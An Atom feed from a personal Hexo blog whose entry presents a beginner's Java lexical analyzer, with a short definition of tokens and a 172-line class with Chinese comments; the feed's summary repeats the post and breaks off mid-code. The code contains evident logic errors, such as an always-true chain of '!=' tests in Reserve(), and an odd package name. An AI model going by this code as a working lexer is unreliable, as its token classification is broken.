<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>opprash</title>
  
  <subtitle>all the FAITHS would get RETRUBITIONS</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-10-13T15:52:06.010Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Lu Ruan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Realize lexical analyzer with java!</title>
    <link href="http://yoursite.com/2017/10/13/new%2011/"/>
    <id>http://yoursite.com/2017/10/13/new 11/</id>
    <published>2017-10-13T09:39:16.429Z</published>
    <updated>2017-10-13T15:52:06.010Z</updated>
    
    <content type="html"><![CDATA[<p>definition:<br>Lexical analyzer function input source program, in accordance with the rules of word decomposition into a series of word symbols. A word is the smallest unit of independence in the language, including keywords, identifiers, operators, delimiters, and constants.<br>(1) The keyword is a fixed identifier defined by the program language. For example, the begin, end, if, while of Pascal are reserved words. These words are usually not used as general identifiers.<br>(2) Identifiers are used to represent various names, such as variable names, array names, process names, and so on.<br>(3) constant constant types are generally integer, real type, Boolean, text and so on.<br>(4) Operators such as +, -, *, / and so on.<br>(5) delimiters such as commas, semicolons, brackets, and so on.<br>Output:<br>Lexical analyzer output word symbols are often expressed as the following binary:<br>                 (Word type, attribute value of word symbol)<br>The word genre is usually encoded in integers. Identifiers are generally classified as one. Constants should be sorted by type (whole, real, boolean, etc.). Keywords can be treated as a whole. Operators can use a method of one character. The boundary character is generally used as a method. For each word symbol, in addition to giving the category code, the attribute information about the word symbol should also be given. The attribute of a word symbol refers to the characteristic or characteristic of a word symbol</p><h2 id="The-specific-implementation-details"><a href="#The-specific-implementation-details" class="headerlink" title="The specific implementation details"></a>The specific implementation details</h2><h3 id="This-is-my-first-use-Java-to-do-a-big-profram-I-will-insisted-to-write-codes-about-Java"><a href="#This-is-my-first-use-Java-to-do-a-big-profram-I-will-insisted-to-write-codes-about-Java" class="headerlink" title="This is my first use Java to do a big profram,I will insisted to write codes about Java!"></a>This is my first use Java to do a big profram,I will insisted to write codes about Java!</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div></pre></td><td class="code"><pre><div class="line">package com.sun.net.ssl.internal.ssl;</div><div class="line">import java.io.BufferedReader;  </div><div class="line">import java.io.FileNotFoundException;  </div><div class="line">import java.io.FileReader;  </div><div class="line">import java.io.IOException;  </div><div class="line">public class shiyan1 &#123;</div><div class="line">public int zifu;  //扫描字符</div><div class="line">public int zhuangtai;//保留字状态码  </div><div class="line">public String [] name=new String[]&#123;<span class="string">"关键字"</span>,<span class="string">"标识符"</span>,<span class="string">"常数"</span>,<span class="string">"关系运算符"</span>,<span class="string">"运算符"</span>,<span class="string">"分界符"</span>,<span class="string">"error"</span>&#125;;      </div><div class="line">    public StringBuffer strToken = new StringBuffer();//存放构成单词符号的字符串  </div><div class="line">      </div><div class="line">    public String [] retainWord = new String[]&#123;<span class="string">"int"</span>,<span class="string">"if"</span>,<span class="string">"else"</span>,<span class="string">"return"</span>,<span class="string">"main"</span>,<span class="string">"void"</span>,<span class="string">"while"</span>,<span class="string">"break"</span>&#125;;//保留字  </div><div class="line">      </div><div class="line">    //判断是否是字母  </div><div class="line">    public boolean <span class="function"><span class="title">IsLetter</span></span>()&#123;  </div><div class="line">        <span class="keyword">if</span>((zifu&gt;=65 &amp;&amp; zifu &lt;= 90) || (zifu &gt;= 97 &amp;&amp; zifu &lt;=122))&#123;  </div><div class="line">            <span class="built_in">return</span> <span class="literal">true</span>;  </div><div class="line">        &#125;  </div><div class="line">        <span class="built_in">return</span> <span class="literal">false</span>;  </div><div class="line">    &#125;  </div><div class="line">      </div><div class="line">    //判断是否是数字  </div><div class="line">    public boolean <span class="function"><span class="title">IsDigit</span></span>()&#123;  </div><div class="line">        <span class="keyword">if</span>(zifu&gt;=48 &amp;&amp; zifu &lt;= 57)&#123;  </div><div class="line">            <span class="built_in">return</span> <span class="literal">true</span>;  </div><div class="line">        &#125;  </div><div class="line">        <span class="built_in">return</span> <span class="literal">false</span>;  </div><div class="line">    &#125;  </div><div class="line">      </div><div class="line">    //判断是否是空格  </div><div class="line">    public boolean IsBC(int ch)&#123;  </div><div class="line">        <span class="keyword">if</span>(ch == 32)&#123;  </div><div class="line">            <span class="built_in">return</span> <span class="literal">true</span>;  </div><div class="line">        &#125;  </div><div class="line">        <span class="built_in">return</span> <span class="literal">false</span>;  </div><div class="line">    &#125;  </div><div class="line">      </div><div class="line">    //连接字符  </div><div class="line">    public void Concat(char ch)&#123;  </div><div class="line">        strToken.append(ch);  </div><div class="line">    &#125;  </div><div class="line">      </div><div class="line">    //判断是否是保留字  </div><div class="line">    public int <span class="function"><span class="title">Reserve</span></span>()&#123;  </div><div class="line">        <span class="keyword">for</span>(int i = 0;i &lt; retainWord.length;i++)&#123;  </div><div class="line">            <span class="keyword">if</span>(strToken.toString().equals(retainWord[i]))&#123;  </div><div class="line">                <span class="built_in">return</span> 1;  </div><div class="line">            &#125;  </div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">if</span>(strToken.length() != 0)&#123;  </div><div class="line">        //String strTaken;</div><div class="line"><span class="keyword">for</span>(int m=0;m&lt;strToken.length();m++)</div><div class="line">            </div><div class="line">        &#123;</div><div class="line"><span class="keyword">for</span>(int j=1;j&lt;m;j++)&#123;</div><div class="line">        <span class="keyword">if</span>(strToken.charAt(j)!=<span class="string">'0'</span> || strToken.charAt(j)!=<span class="string">'1'</span> || strToken.charAt(j)!=<span class="string">'2'</span> ||strToken.charAt(j)!=<span class="string">'3'</span> || strToken.charAt(j)!=<span class="string">'4'</span> || strToken.charAt(j)!=<span class="string">'5'</span> || strToken.charAt(j)!=<span class="string">'6'</span> || strToken.charAt(j)!=<span class="string">'7'</span> || strToken.charAt(j)!=<span class="string">'8'</span> || strToken.charAt(j)!=<span class="string">'9'</span> )</div><div class="line">         &#123;<span class="built_in">return</span> 5;</div><div class="line">         </div><div class="line">         &#125;</div><div class="line">            </div><div class="line">            &#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(strToken.charAt(m)&gt;=<span class="string">'0'</span> &amp;&amp; strToken.charAt(m)&lt;=<span class="string">'9'</span>)&#123;  </div><div class="line">                <span class="built_in">return</span> 3; </div><div class="line">                </div><div class="line">                &#125;</div><div class="line">        </div><div class="line">        &#125;</div><div class="line">//<span class="keyword">if</span>(strToken.charAt(0)!=IsLetter())</div><div class="line"></div><div class="line">        &#125; </div><div class="line">       </div><div class="line">          //<span class="keyword">if</span>()</div><div class="line">        <span class="built_in">return</span> 2;  </div><div class="line">    &#125;  </div><div class="line">      </div><div class="line">    //  </div><div class="line">    public void <span class="function"><span class="title">Retract</span></span>()&#123;  </div><div class="line">    zhuangtai = Reserve();  </div><div class="line">        <span class="keyword">if</span>(zhuangtai == 1)&#123;  </div><div class="line">                System.out.println(<span class="string">"('"</span>+1+<span class="string">"','"</span>+strToken+<span class="string">"','"</span>+name[0]+<span class="string">"')"</span>);  </div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zhuangtai == 2)&#123;  </div><div class="line">                System.out.println(<span class="string">"('"</span>+2+<span class="string">"','"</span>+strToken+<span class="string">"','"</span>+name[1]+<span class="string">"')"</span>);  </div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(zhuangtai == 3)&#123;  </div><div class="line">                System.out.println(<span class="string">"('"</span>+3+<span class="string">"','"</span>+strToken+<span class="string">"','"</span>+name[2]+<span class="string">"')"</span>);</div><div class="line">        &#125;</div><div class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(zhuangtai == 5)&#123;  </div><div class="line">                    System.out.println(<span class="string">"('"</span>+6+<span class="string">"','"</span>+strToken+<span class="string">"','"</span>+name[6]+<span class="string">"')"</span>);  </div><div class="line">        &#125;  </div><div class="line">        strToken.delete(0, strToken.length());  </div><div class="line">    &#125;  </div><div class="line">      </div><div class="line">    /**  </div><div class="line">     * 读取文件  </div><div class="line">     */  </div><div class="line">    public void <span class="function"><span class="title">scanner</span></span>()&#123;  </div><div class="line">        BufferedReader br;  </div><div class="line">        try &#123;  </div><div class="line">            br = new BufferedReader(new FileReader(<span class="string">"C:/Users/Administrator/Desktop/rootkid/xx.txt"</span>));  </div><div class="line">            <span class="keyword">while</span>((zifu = br.read()) != -1)&#123;   </div><div class="line">                <span class="keyword">if</span>(IsBC(zifu) == <span class="literal">false</span>)&#123;  </div><div class="line">                    <span class="keyword">if</span>(IsLetter())&#123;  </div><div class="line">                        <span class="keyword">if</span>(IsLetter() == <span class="literal">true</span> || IsDigit() == <span class="literal">true</span>)&#123;  </div><div class="line">                            Concat((char)zifu);  </div><div class="line">                        &#125;  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(IsDigit() == <span class="literal">true</span>)&#123;  </div><div class="line">                        Concat((char)zifu);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(IsDigit())&#123;  </div><div class="line">                        Concat( (char)zifu);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zifu == 61)&#123;  </div><div class="line">                        <span class="keyword">if</span>((strToken.length() != 0 )&amp;&amp; (strToken.charAt(0) == <span class="string">'='</span>))&#123;  </div><div class="line">                            strToken.append((char)zifu);  </div><div class="line">                            System.out.println(<span class="string">"('"</span>+4+<span class="string">"','"</span>+strToken+<span class="string">"','"</span>+name[3]+<span class="string">"')"</span>);  </div><div class="line">                            strToken.delete(0, strToken.length());  </div><div class="line">                        &#125;<span class="keyword">else</span>&#123;  </div><div class="line">                            strToken.append((char)zifu);  </div><div class="line">                        &#125;  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zifu == 43)&#123;  </div><div class="line">                        Retract();  </div><div class="line">                        System.out.println(<span class="string">"('"</span>+4+<span class="string">"','"</span>+ (char)zifu+<span class="string">"','"</span>+name[4]+<span class="string">"')"</span>);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zifu == 45)&#123;  </div><div class="line">                        Retract();  </div><div class="line">                        System.out.println(<span class="string">"('"</span>+4+<span class="string">"','"</span>+ (char)zifu+<span class="string">"','"</span>+name[4]+<span class="string">"')"</span>);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zifu == 42)&#123;  </div><div class="line">                        Retract();  </div><div class="line">                        System.out.println(<span class="string">"('"</span>+4+<span class="string">"','"</span>+ (char)zifu+<span class="string">"','"</span>+name[4]+<span class="string">"')"</span>);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zifu == 47)&#123;  </div><div class="line">                        Retract();  </div><div class="line">                        System.out.println(<span class="string">"('"</span>+4+<span class="string">"','"</span>+ (char)zifu+<span class="string">"','"</span>+name[4]+<span class="string">"')"</span>);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">';'</span>)&#123;  </div><div class="line">                        Retract();  </div><div class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>+ (char)zifu+<span class="string">"','"</span>+name[5]+<span class="string">"')"</span>);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">'('</span>)&#123;  </div><div class="line">                        Retract();  </div><div class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>+ (char)zifu+<span class="string">"','"</span>+name[5]+<span class="string">"')"</span>);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">')'</span>)&#123;  </div><div class="line">                        Retract();  </div><div class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>+ (char)zifu+<span class="string">"','"</span>+name[5]+<span class="string">"')"</span>);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">'&#123;'</span>)&#123;  </div><div class="line">                        Retract();  </div><div class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>+ (char)zifu+<span class="string">"','"</span>+name[5]+<span class="string">"')"</span>);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">'&#125;'</span>)&#123;  </div><div class="line">                        Retract();  </div><div class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>+ (char)zifu+<span class="string">"','"</span>+name[5]+<span class="string">"')"</span>);  </div><div class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">','</span>)&#123;  </div><div class="line">                        Retract();  </div><div class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>+ (char)zifu+<span class="string">"','"</span>+name[5]+<span class="string">"')"</span>);  </div><div class="line">                    &#125;</div><div class="line">                    </div><div class="line">                    //<span class="keyword">else</span> <span class="keyword">if</span>(zifu)&#123;&#125;</div><div class="line">                      </div><div class="line">                &#125;<span class="keyword">else</span>&#123;  </div><div class="line">                    Retract();  </div><div class="line">                &#125;  </div><div class="line">                  </div><div class="line">            &#125;  </div><div class="line">        &#125; catch (FileNotFoundException e1) &#123;  </div><div class="line">            // TODO Auto-generated scatch block  </div><div class="line">            e1.printStackTrace();  </div><div class="line">        &#125; catch (IOException e) &#123;  </div><div class="line">            // TODO Auto-generated catch block  </div><div class="line">            e.printStackTrace();  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">      </div><div class="line">    public static void main(String[] args) &#123;  </div><div class="line">        shiyan1 compile2 = new shiyan1();  </div><div class="line">        compile2.scanner();  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">&#125;</div></pre></td></tr></table></figure><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;definition:&lt;br&gt;Lexical analyzer function input source program, in accordance with the rules of word decomposition into a series of word symbols. A word is the smallest unit of independence in the language, including keywords, identifiers, operators, delimiters, and constants.&lt;br&gt;(1) The keyword is a fixed identifier defined by the program language. For example, the begin, end, if, while of Pascal are reserved words. These words are usually not used as general identifiers.&lt;br&gt;(2) Identifiers are used to represent various names, such as variable names, array names, process names, and so on.&lt;br&gt;(3) constant constant types are generally integer, real type, Boolean, text and so on.&lt;br&gt;(4) Operators such as +, -, *, / and so on.&lt;br&gt;(5) delimiters such as commas, semicolons, brackets, and so on.&lt;br&gt;Output:&lt;br&gt;Lexical analyzer output word symbols are often expressed as the following binary:&lt;br&gt;                 (Word type, attribute value of word symbol)&lt;br&gt;The word genre is usually encoded in integers. Identifiers are generally classified as one. Constants should be sorted by type (whole, real, boolean, etc.). Keywords can be treated as a whole. Operators can use a method of one character. The boundary character is generally used as a method. For each word symbol, in addition to giving the category code, the attribute information about the word symbol should also be given. The attribute of a word symbol refers to the characteristic or characteristic of a word symbol&lt;/p&gt;
&lt;h2 id=&quot;The-specific-implementation-details&quot;&gt;&lt;a href=&quot;#The-specific-implementation-details&quot; class=&quot;headerlink&quot; title=&quot;The specific implementation details&quot;&gt;&lt;/a&gt;The specific implementation details&lt;/h2&gt;&lt;h3 id=&quot;This-is-my-first-use-Java-to-do-a-big-profram-I-will-insisted-to-write-codes-about-Java&quot;&gt;&lt;a href=&quot;#This-is-my-first-use-Java-to-do-a-big-profram-I-will-insisted-to-write-codes-about-Java&quot; class=&quot;headerlink&quot; title=&quot;This is my first use Java to do a big profram,I will insisted to write codes about Java!&quot;&gt;&lt;/a&gt;This is my first use Java to do a big profram,I will insisted to write codes about Java!&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;79&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;81&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;82&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;83&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;85&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;86&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;87&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;88&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;89&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;91&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;92&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;93&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;94&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;95&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;96&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;97&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;98&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;99&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;100&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;102&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;103&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;104&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;105&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;106&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;107&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;108&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;109&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;110&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;111&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;112&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;113&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;114&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;115&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;116&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;117&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;118&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;119&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;120&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;121&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;122&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;123&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;124&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;125&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;126&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;127&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;128&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;129&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;130&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;131&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;132&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;133&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;134&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;135&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;136&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;137&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;138&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;139&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;140&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;141&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;142&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;143&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;144&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;145&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;146&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;147&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;148&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;149&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;150&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;151&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;152&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;153&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;154&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;155&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;156&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;157&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;158&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;159&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;160&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;161&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;162&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;163&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;164&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;165&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;166&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;167&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;168&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;169&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;170&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;171&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;172&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;package com.sun.net.ssl.internal.ssl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;import java.io.BufferedReader;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;import java.io.FileNotFoundException;  